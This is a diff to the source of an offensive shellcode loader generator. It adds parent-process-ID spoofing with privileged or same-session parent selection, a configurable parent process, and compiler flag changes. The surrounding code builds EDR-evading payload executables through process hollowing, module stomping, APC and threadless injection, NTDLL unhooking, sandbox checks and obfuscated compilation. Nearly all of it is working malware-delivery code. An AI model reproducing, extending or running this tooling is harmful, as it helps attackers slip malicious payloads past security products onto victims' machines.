@@ -645,7 +645,125 @@ int getLoadedDlls()
 }
 """
 
+# Thanks to @Snovvcrash for helping improve PPID spoofing
+ppid_priv_check = """
+                if (GetProcElevation(entry.th32ProcessID))
+                {
+                    CLIENT_ID cID;
+                    cID.UniqueThread = 0;
+                    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);
+
+                    OBJECT_ATTRIBUTES oa;
+                    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+
+                    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);
+
+                    if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
+                    {
+                        NewNtClose(snapshot);
+                        return hProcess;
+                    }
+                    else
+                    {
+                        NewNtClose(snapshot);
+                        return INVALID_HANDLE_VALUE;
+                    }
+                }
+"""
+
+ppid_unpriv_check = """
+                DWORD sessionID;
+                ProcessIdToSessionId(GetCurrentProcessId(), &sessionID);
+                if (sessionID == GetProcSessionID(entry.th32ProcessID))
+                {
+                    CLIENT_ID cID;
+                    cID.UniqueThread = 0;
+                    cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);
+
+                    OBJECT_ATTRIBUTES oa;
+                    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+
+                    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);
+
+                    if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
+                    {
+                        NewNtClose(snapshot);
+                        return hProcess;
+                    }
+                    else
+                    {
+                        NewNtClose(snapshot);
+                        return INVALID_HANDLE_VALUE;
+                    }
+                }
+"""
+
+get_proc_session_ID = """
+DWORD GetProcSessionID(DWORD procID)
+{
+    HANDLE hProcess = NULL;
+
+    CLIENT_ID cID;
+    cID.UniqueThread = 0;
+    cID.UniqueProcess = UlongToHandle(procID);
+
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+
+    NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cID);
+
+    HANDLE hToken;
+    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken))
+    {
+        DWORD dwTokLen = GetTokenInfoLength(hToken, TokenSessionId);
+        LPDWORD lpSessionId = (LPDWORD)VirtualAlloc(nullptr, dwTokLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        DWORD dwRetLen;
+        if (GetTokenInformation(hToken, TokenSessionId, lpSessionId, dwTokLen, &dwRetLen))
+            return *lpSessionId;
+    }
+    return 0;
+}
+"""
+
+get_proc_elevation = """
+DWORD GetProcElevation(DWORD procID)
+{
+    HANDLE hProcess = NULL;
+
+    CLIENT_ID cID;
+    cID.UniqueThread = 0;
+    cID.UniqueProcess = UlongToHandle(procID);
+
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
+
+    NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cID);
+
+    HANDLE hToken;
+    if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken))
+    {
+        DWORD dwTokLen = GetTokenInfoLength(hToken, TokenElevation);
+        DWORD dwRetLen;
+        TOKEN_ELEVATION_TYPE elevType;
+        if (GetTokenInformation(hToken, TokenElevation, &elevType, dwTokLen, &dwRetLen)) {
+            return elevType;
+        }
+    }
+    return 0;
+}
+"""
+
 process_functions = """
+DWORD GetTokenInfoLength(HANDLE hToken, TOKEN_INFORMATION_CLASS tokClass)
+{
+    DWORD dwRetLength = 0x0;
+    GetTokenInformation(hToken, tokClass, NULL, 0x0, &dwRetLength);
+
+    return dwRetLength;
+}
+
+REPLACE_GET_PROC_TOKEN_FUNCTION
+
 HANDLE GetParentHandle(LPCSTR parent)
 {
     HANDLE hProcess = NULL;
@@ -660,25 +778,7 @@ HANDLE GetParentHandle(LPCSTR parent)
         {
             if (stricmp(entry.szExeFile, parent) == 0)
             {
-                CLIENT_ID cID;
-                cID.UniqueThread = 0;
-                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);
-
-                OBJECT_ATTRIBUTES oa;
-                InitializeObjectAttributes(&oa, 0, 0, 0, 0);
-
-                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);
-
-                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
-                {
-                    NewNtClose(snapshot);
-                    return hProcess;
-                }
-                else
-                {
-                    NewNtClose(snapshot);
-                    return INVALID_HANDLE_VALUE;
-                }
+                REPLACE_PPID_PRIV_CHECK
             }
         }
     }
@@ -823,8 +923,7 @@ LPVOID MapNtdll() {
 
 BOOL Unhook(LPVOID module) {
 
-    char sntdll[] = { 'n','t','d','l','l','.','d','l','l' };
-    HANDLE hntdll = GetModuleHandleA(sntdll);
+    HANDLE hntdll = GetModuleHandleA(Nt);
 
     PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
     PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(module)+DOSheader->e_lfanew);
@@ -924,7 +1023,7 @@ UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size)
 """
 
 threadless_inject_create_stub = """
-    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
+    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -1097,7 +1196,7 @@ module_stomping_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
+    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -1245,7 +1344,7 @@ process_hollow_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
+    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -1515,7 +1614,7 @@ QueueUserAPC_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
+    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -1710,7 +1809,7 @@ RemoteThreadContext_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
+    HANDLE hParent = GetParentHandle(skCrypt("REPLACE_PPID_PROCESS"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
@@ -1962,8 +2061,12 @@ def generateRandomSyscall(length):
     return syscall
 
 
-def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy, unhook, syscall_arg, create_process, target_dll, export_function):
+def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy, unhook, syscall_arg, create_process, target_dll, export_function, ppid_process, ppid_priv):
     print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
+    if obfuscator_LLVM == True:
+        if syscall_arg == "syswhispers2" or syscall_arg == "syswhispers3":
+            print("[+] SysWhispers is not compatible with Obfuscator-LLVM; switching to GetSyscallStub")
+            syscall_arg = "getsyscallstub"
     method = method.lower()
     file_size = os.path.getsize(infile)
     if method == "processhollow":
@@ -2170,6 +2273,15 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_PPID_SPOOF", "")
     else:
         stub = stub.replace("REPLACE_PPID_SPOOF", "UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);")
+        if ppid_priv == True:
+            print(f"[+] Attemping to use privileged {ppid_process} for PPID Spoofing")
+            stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_elevation)
+            stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_priv_check)
+        else:
+            stub = stub.replace("REPLACE_GET_PROC_TOKEN_FUNCTION", get_proc_session_ID)
+            print(f"[+] Attemping to use non-privileged {ppid_process} for PPID Spoofing")
+            stub = stub.replace("REPLACE_PPID_PRIV_CHECK", ppid_unpriv_check)
+    stub = stub.replace("REPLACE_PPID_PROCESS", ppid_process)
 
     if no_sandbox == True:
         print("[+] Sandbox checks have been disabled")
@@ -2253,7 +2365,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
             # Feel free to modify the OLLVM flags to fit your needs.
             os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
         else:
-            os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lntdll -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
+            os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lntdll -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
     else:
         if obfuscator_LLVM == True:
             print("[+] Using Obfuscator-LLVM to compile stub...")
@@ -2267,12 +2379,12 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
                 os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -lntdll -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
         else:
             if dll == True and dll_proxy != None:
-                os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
                 os.system("rm stub.def")
             elif dll == True and dll_proxy == None:
-                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -shared -o {}".format(outfile))
             else:
-                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -std=c++17 -masm=intel -fpermissive -static -lpsapi -lntdll -Wl,--subsystem,windows -o {}".format(outfile))
     if os.path.exists(outfile) == True:
         print("[!] {} has been compiled successfully!".format(outfile))
     else:
@@ -2290,7 +2402,6 @@ parser.add_argument('-u', '--unhook', action='store_true', help='Unhook NTDLL in
 parser.add_argument('-w', '--word-encode', action='store_true', help='Save shellcode in stub as array of English words')
 parser.add_argument('-nr', '--no-randomize', action='store_true', help='Disable syscall name randomization')
 parser.add_argument('-ns', '--no-sandbox', action='store_true', help='Disable sandbox checks')
-parser.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
 parser.add_argument('-l', '--llvm-obfuscator', action='store_true', help='Use Obfuscator-LLVM to compile stub')
 parser.add_argument('-v', '--verbose', action='store_true', help='Enable debugging messages upon execution')
 parser.add_argument('-sc', '--syscall', dest='syscall_arg', help='Syscall execution method (Options: SysWhispers2, SysWhispers3, GetSyscallStub, None) (Default: GetSyscallStub)', metavar='GetSyscallStub', default='GetSyscallStub')
@@ -2299,6 +2410,10 @@ parser.add_argument('-dp', '--dll-proxy', dest='dll_proxy', metavar='apphelp.dll
 parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: sleep, domain, hostname, username, dll) (Default: sleep)', metavar='domain', default='sleep')
 parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='testlab.local')
 parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
+ppid_options = parser.add_argument_group('PPID Spoofing')
+ppid_options.add_argument('-pp', '--ppid', dest='ppid', metavar='explorer.exe', help='Parent process to use for PPID Spoofing (Default: explorer.exe)', default='explorer.exe')
+ppid_options.add_argument('-ppv', '--ppid-priv', action='store_true', help='Enable spoofing for privileged parent process (Disabled by default)')
+ppid_options.add_argument('-np', '--no-ppid-spoof', action='store_true', help='Disable PPID spoofing')
 thredless_options = parser.add_argument_group('ThreadlessInject')
 thredless_options.add_argument('-cp', '--create-process', dest='create_process', action='store_true', help='Create process instead of injecting into existing one')
 thredless_options.add_argument('-td', '--target-dll', dest='target_dll', help='Target DLL containing export function to overwrite', metavar='ntdll.dll', default='ntdll.dll')
@@ -2332,14 +2447,12 @@ try:
         print("[!] Invalid shellcode execution method provided!")
         print("[+] Valid shellcode execution methods are: ModuleStomping, QueueUserAPC, ProcessHollow, EnumDisplayMonitors, RemoteThreadContext, RemoteThreadSuspended, CurrentThread")
         sys.exit()
-    if args.llvm_obfuscator == True:
-        args.get_syscallstub = True
     if args.process == "msedge.exe":
         args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
     elif args.process == "iexplore.exe":
         args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
     key = generateKey(49)
-    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy, args.unhook, syscall_arg, args.create_process, args.target_dll, args.export_function)
+    main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy, args.unhook, syscall_arg, args.create_process, args.target_dll, args.export_function, args.ppid, args.ppid_priv)
 except:
     raise
     sys.exit()
